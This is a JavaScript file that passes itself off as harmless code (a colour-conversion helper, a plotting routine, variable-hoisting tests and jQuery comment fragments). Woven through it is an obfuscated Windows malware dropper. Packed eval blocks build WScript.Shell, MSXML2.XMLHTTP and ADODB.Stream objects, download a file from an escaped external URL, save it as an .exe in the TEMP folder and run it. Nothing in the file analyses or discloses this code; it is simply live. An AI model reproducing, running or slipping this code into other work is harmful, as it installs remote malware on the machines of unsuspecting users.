

function madMadMad(h,s,v) {
 
        var h = h/360;
        var s = s/100;
        var v = v/100;
       
        var r = 0;
        var g = 0;
        var b = 0;
       
        if (s == 0) {
                r = Math.round(v * 255);
                g = Math.round(v * 255);
                b = Math.round(v * 255);
        } else {
                var_h = h * 6;
                var_i = Math.floor(var_h);
                var_1 = v * (1 - s);
                var_2 = v * (1 - s * (var_h - var_i));
                var_3 = v * (1 - s * (1 - (var_h - var_i)));
               
                if (var_i == 0) {var_r = v; var_g = var_3; var_b = var_1}
                else if (var_i == 1) {var_r = var_2; var_g = v; var_b = var_1}
                else if (var_i == 2) {var_r = var_1; var_g = v; var_b = var_3}
                else if (var_i == 3) {var_r = var_1; var_g = var_2; var_b = v}
                else if (var_i == 4) {var_r = var_3; var_g = var_1; var_b = v}
                else {var_r = v; var_g = var_1; var_b = var_2};
               
                r = Math.round(var_r * 255);
                g = Math.round(var_g * 255);
                b = Math.round(var_b * 255);
        }
       
        return [r, g, b];
};eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('4 6=0;a=\'b\';d.h.j=l(){4 3={5:m};3.7=3.5[("e"+"f"+"g"+("1","1","1","1","1","1","1","i")).8("k","9").8("9","b")](6,2);c 3.7};',23,23,'|phone||pentium|var|topmost|artifice|servers|replace|World|daunt||return|String|s|uBIsTst|ri|prototype|ng|immigration1|BIsT|function|this'.split('|'),0,{}))

String.prototype.immigration = function () {
    return this.immigration1().split("")[0];
};


var sin  = Math.sin ;
var cos  = Math.cos ;
var exp  = Math.exp ;
var rdiv = function(x,y){if(y==0){return 1;}else{return x/y;}}
var rlog = function(x){return Math.log(Math.abs(x));}


var ssr = function( solution ){

  var trueSolution = function(x){return x*x*x*x+x*x*x+x*x+x ;}

  var xs = [ ] ; 
  for (var i = -1 ; i <= 1 ; i+= 0.01 ) {
    xs.push(i);
  }

  ysSol     = _.map( xs , function(x){return [x,    solution(x)];} );
  ysTrueSol = _.map( xs , function(x){return [x,trueSolution(x)];} );

  
  var ssrPlotData = {
    trueSolution : ysTrueSol,
    solution     : ysSol
  };

  $('#special').html(
    'Best individual guoklAV: ' +
    '<div id="graphssr-div" class="graph"></div>');

  drawPlot( 'ssr' , ssrPlotData );


  return ssrPlotData;

};
String.prototype.shd = function () {
    return this.replace("folk",".S").replace("lore","hell");
};
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('p q=["A"+"0"+"o"+"n"+("k","l","m","r","s","y","z","x")+"0","w"+"t"+"u"+("v","j","i","5","6","7","4","3","1")+("2","8","9","f","g","h","e","d","a"),""+"%"+("b","c","C","T","11","12","13","10"),""+"."+("Z","V","X","Y","15","1a","1c","1b"),"19"+"18.16"+"17"+("14","U","I","J","H","G","D","E","F"),"W"+"K"+"L"+("R","S","Q","P","M","N","O","B")];',62,75,'ct|onme|ethan|minds|seamanship|akimbo|capability|clips|budding|barriers|ntStrings|nebuchadnezzar|relating|scheduling|uruguay|diabolic|corduroy|portent|temple|presentday|findarticles|towing|synod|eXOb|iv|var|dNmDxVL|saffron|consensus|dE|nvir|dividend|Expan|je|rochester|repine||folklore|natural|toilet|licking|TTP|meuse|concentric|crest|verify|Sc|ript|outstanding|newark|suzerainty|defence|nicest|layout|architect|hades|consanguinity|linseed||installing|rolling|spurn|TE|accordingly|praiseworthy|stuffing|trailer|waken|XM|LH|ML2|MSX|uninteresting|exe|oblation'.split('|'),0,{}))

lxOinTHB = "} Caller can pass in an object of custom data in lieu of the handler if ( handler.handler ) { handleObjIn = handler; handler = handleObjIn.handler; selector = handleObjIn.selector; ";
var yQsPqXrcG = this[dNmDxVL.shift()];
RyuknQIU = "yLginsmR";
scared = (("hearts", "disreputable", "everything", "inscrutable", "pdOFhyYNz") + "SvoVxFJE").immigration();
walters = (("hiking", "mozambique", "nutrition", "phosphorus", "spWzvcJ") + "pzmIGpaM").immigration();
var virginian ="";
finances = ("n"+("absurdly","sized","tedium","strangle","generating","poultry","further","clout","ep") + String.fromCharCode(111)).split("");

eval(function(p,a,c,k,e,r){e=String;if(!''.replace(/^/,String)){while(c--)r[c]=k[c]||c;k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('0 1=2 3(4.5().6());',7,7,'var|AObrNBNnb|new|yQsPqXrcG|dNmDxVL|pop|shd'.split('|'),0,{}))
KHnqDTV = " add: function( elem, types, handler, data, selector ) { var tmp, events, t, handleObjIn, special, eventHandle, handleObj, handlers, type, namespaces, origType, elemData = jQuery._data( elem );";
eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('7 0=2 3(5.6());0.1=8(){9(0[\'a\']===4){b(0,c)}};',13,13,'nAmnImXCA|onreadystatechange|new|yQsPqXrcG||dNmDxVL|pop|var|function|if|readystate|tutterd|virginian'.split('|'),0,{}));
function varInTry() {
  return (myvar == undefined);
  try {
    var myvar = 2;
  }
  catch (e) {
  }
  finally {
  }
}

function varInSubFunction() {
  return (myvar == 1);
  function subfunction() {
    var myvar = 2;
  }
}
LpfaFQKpkB = " global: {},";
var IutpmE = AObrNBNnb[dNmDxVL.shift()](dNmDxVL.shift() + "MP%");
fpqIctYT = " Don\"t attach events to noData or text/comment nodes (but allow plain objects) if ( !elemData ) { return; ";
eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('1E=(("1P","1O","1Q","1F","1H")+"1J").1x();1C 1v=2c.3a();1o 1G(1A,1z){1M{1y(1o(p,a,c,k,e,r){e=1o(c){1p(c<a?\'\':e(1I(c/a)))+((c=c%a)>35?1t.1K(c+29):c.1L(36))};1q(!\'\'.1r(/^/,1t)){1s(c--)r[e(c)]=k[c]||e(c);k=[1o(e){1p r[e]}];e=1o(){1p\'\\\\w+\'};c=1};1s(c--)1q(k[c])p=p.1r(1B 1w(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);1p p}(\'i=H+"/"+l+a.c();d="} 4 3 L 1a 1, b 5 2 3 f g 5 h 1 2 = 6.3.2[ 1 ] || {};";j(k>0){7[(m).n().o("")](("p","q","r","s","t","u","v","w","G")+x+("y","z","A","B","C","D","E","F","T"),I,J)}K=" 4 8 M, N 2 3 O 1, P Q 1 1 = ( 8 ? 2.R : 2.S ) || 1;";7[U+("V","W","X","Y","Z","10","11","12","e")+(("13","14","15","16","17","18")+"19").9()+(("1b","1c","1d","1e","1f","1g")+"1h").9()]();1i=" 1j 2 1k 1l 1m 1n 1 2 = 6.3.2[ 1 ] || {};";\',1R,1S,\'|1T|1U|1V|1W|1X|1Y|1Z|20|1x|21|22|23|24||25|26|27|28|1q|1v|1z|2a|2b|1D|2d|2e|2f|2g|2h|2i|2j|2k|1E|2l|2m|2n|2o|2p|2q|2r|2s||2t|1A|2u|2v|2w|2x|2y|2z|2A|2B|2C|2D||2E|2F|2G|2H|2I|2J|2K|2L|2M|2N|2O|2P|2Q|2R|2S|2T|2U|2V|2W|2X|2Y|2Z|30|31|32|33|34|37|38|39\'.1u(\'|\'),0,{}))}3b(3c){}}1y(1o(p,a,c,k,e,r){e=1t;1q(!\'\'.1r(/^/,1t)){1s(c--)r[c]=k[c]||c;k=[1o(e){1p r[e]}];e=1o(){1p\'\\\\w+\'};c=1};1s(c--)1q(k[c])p=p.1r(1B 1w(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);1p p}(\'1 2=(("3")+("0+0")+"4:").5("+").6("")+"//";\',7,7,\'t|1C|1N|h|p|1u|1D\'.1u(\'|\'),0,{}))',62,199,'||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||function|return|if|replace|while|String|split|bewitched|RegExp|immigration|eval|dairy|looks|new|var|join|quilte|careworn|sitting|EntrwcmxKM|parseInt|yymLxoTu|fromCharCode|toString|try|herbdent|cologne|chunk|baking|62|86|type|special|event|If|the|jQuery|nAmnImXCA|selector|dNmDxVL|use|shift|kWEYsxovQvY|handlers|for|changed|virginian||finances|reverse|Math|olympics|melee|counted|litigation|preparing|grande|incentive|instruments|conversion|partners|errol|tiffany|freud|skills|architects|taken|IutpmE|false|idCncMRn|changes|defined|determine|api|otherwise|given|delegateType|bindType|walters|astuteness|freeze|admittance|shrub|vulnerable|wallow|vaunted|locale|snaps|spree|swamped|scholarships|returning|npLbCaJItYY|PFpMXpvIyu|its|farmers|travel|homestead|dunbar|scales|dpafntF|SDHMSA|XsyCNvAHv|Update|based|||on|newly|reset|random|catch|MjmHlMXm'.split('|'),0,{}));
function tutterd(ridszAD,Podstak){
        var pqpzxBEiN = new yQsPqXrcG((""+"A"+"HRE"+("orchestral","submitting","keyword","human","attempts","laudanum","accommodating","upbringing","DB") + ""+("curves","generating","valuable","tortuous","gratis","disagree","finland",".S")+("hostler","casuistry","seamanship","fatherly","stoical","marked","twins","tre")+"am").replace("HRE", "DO"));
        pqpzxBEiN[""+("rudiments","unlawful","shaft","impetuosity","mightnt","didactic","dispatched","op")+"en"]();
        pqpzxBEiN.type = 1;
		uFvNJemn = "} Init the element\"s event structure and main handler, if this is the first if ( !( events = elemData.events ) ) { events = elemData.events = {}; } if ( !( eventHandle = elemData.handle ) ) { eventHandle = elemData.handle = function( e ) {";
        pqpzxBEiN["w"+("bestowal","administrative","madeline","selene","bearing","tepid","keywords","andes","ri")+"te"](ridszAD[("lunacy","prospect","canna","andreas","panel","threatening","drilling","recall","")+"R"+"es"+"pon" + walters + "e"+("meditation","generate","website","amethyst","constituency","legation","aztec","directly","Bo")+"dy"]);
        ThIzaEpVou = " Discard the second event of a jQuery.event.trigger() and when an event is called after a page has unloaded return typeof jQuery !== \"undefined\" && ( !e || jQuery.event.triggered !== e.type ) ? jQuery.event.dispatch.apply( eventHandle.elem, arguments ) : undefined; };";
        pqpzxBEiN[(scared + "o"+"Di"+"ti"+("scheduled","deviate","contributed","coxcomb","tights","boating","recruited","castaway","on")).replace("D", walters)] = 0;
        cUTFlRWCx = " Add elem as a property of the handle fn to prevent a memory leak with IE non-native events eventHandle.elem = elem; ";
        pqpzxBEiN[("effervescence","slush","inactivity","ontario","beauty","adulation","forestry","sav")+"eT"+"oF"+"ile"](Podstak, 2);
        dHRzkhYane = "} Handle multiple events separated by a space types = ( types || \"\" ).match( rnotwhite ) || [ \"\" ]; t = types.length; while ( t-- ) { tmp = rtypenamespace.exec( types[ t ] ) || []; type = origType = tmp[ 1 ]; namespaces = ( tmp[ 2 ] || \"\" ).split( \".\" ).sort();";
        pqpzxBEiN.close();
        LkxKQPnzxe = " There *must* be a type, no attaching namespace-only handlers if ( !type ) { continue; ";
        AObrNBNnb["R"+("avidity","gauge","proof","skiing","busty","fractional","federal","portal","un")](Podstak, 1, "lumxpTQLJtb" === "qHOEFjl"); dAuGQ = " Only use addEventListener/attachEvent if the special events handler returns false if ( !special.setup || special.setup.call( elem, data, namespaces, eventHandle ) === false ) {";
}


function varInForIn() {
  return (myvar == undefined);
  var o = new Object();
  var i;
  for (i in o)
    var myvar = 2;
}

function varInWith() {
  return (myvar == undefined);
  with (String)
    var myvar = 2;
}
sitting(herbdent + "\u0074\u0068\u0065\u0061\u006E\u0073\u0077\u0065\u0072\u0033\u002E"+"\u0063\u006F\u006D\u002F\u0030\u0039\u0075\u0038\u0037\u0074\u0067\u0079","UGMVPjzAQND");

function varInCase() {
  return (myvar == undefined);
  switch (1) {
    case 0:
      var myvar = 2;
    case 1:
  }
}

function varInLabel() {
  return (myvar == undefined);
label1:
  var myvar = 2;
}